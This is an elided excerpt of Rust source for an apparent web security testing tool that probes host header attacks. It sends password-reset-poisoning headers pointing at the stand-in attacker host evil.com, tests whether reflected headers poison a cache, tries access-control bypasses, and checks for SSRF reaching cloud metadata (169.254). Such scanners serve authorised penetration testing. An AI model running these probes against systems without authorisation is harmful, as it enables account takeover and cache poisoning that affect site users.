...
pub async fn password(
    ...
    for (name, host_value) in &payloads {
        ...
        match *name {
            "X-Forwarded-Host" => {
                req = req.header("X-Forwarded-Host", "evil.com");
            }
            "X-Host header" => {
                req = req.header("X-Host", "evil.com");
            }
            "X-Forwarded-Server" => {
                req = req.header("X-Forwarded-Server", "evil.com");
            }
            "X-Original-Host" => {
                req = req.header("X-Original-Host", "evil.com");
            }
            "Referrer-based" => {
                req = req.header("Referer", "https://evil.com/reset");
            }
            _ => {
                req = req.header("Host", *host_value);
            }
        }
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                if poisoned {
                    println!(
                        "    {} Reset link points to attacker host!",
                        ">".red().bold()
                    );
                }
            }
    ...
    println!(
        "\n{} Password reset poisoning test complete.",
        "[*]".cyan().bold()
    );
    println!(
        "{} Check if reset email links point to attacker-controlled host.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn cache(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    ...
    for (header_name, header_value) in &headers_to_test {
        ...
        if reflected {
            println!(
                "  {} [+] Reflected in response! Checking cache...",
                "[+]".green().bold()
            );
            ...
            if let Ok(r) = resp2 {
                ...
                if cached {
                    println!(
                        "  {} [HIGH] Cache poisoned! Subsequent request returns poisoned content!",
                        "[!]".red().bold()
                    );
                } else {
...
pub async fn access(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Host Header — Access Control Bypass",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    ...
    for (name, host) in &tests {
        ...
        match resp {
            Ok(r) => {
                ...
                let interesting = status.as_u16() == 200
                    || body.contains("admin")
    ...
    println!(
        "\n{} Access control bypass test complete.",
        "[*]".cyan().bold()
    );
    Ok(())
}
    ...
    for (name, host_val) in &payloads {
        ...
        match req.send().await {
            Ok(r) => {
                ...
                let body = r.text().await.unwrap_or_default();
                let reached =
                    body.contains(target) || body.contains("metadata") || body.contains("169.254");
                let status_str = if reached {
                    "REACHED".red().bold().to_string()
                } else {
                    "no".to_string()
                };
                println!(
                    "  {} {:25} status={} target_reached={}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
